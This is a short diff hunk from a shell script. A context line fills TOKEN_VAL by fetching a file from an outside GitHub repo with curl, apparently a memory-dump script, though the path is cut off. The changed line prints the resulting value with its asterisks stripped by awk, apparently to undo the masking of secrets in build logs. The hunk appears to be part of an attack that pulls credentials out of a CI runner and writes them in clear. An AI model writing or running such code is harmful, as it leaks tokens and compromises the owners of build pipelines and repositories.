@@ -9,7 +9,7 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
-echo "$TOKEN_VAL" | tr -d *
+echo "$TOKEN_VAL" | awk 'gsub(/\*/,X) 1'
 echo "---------------------------3--------------------------------------"
 
 
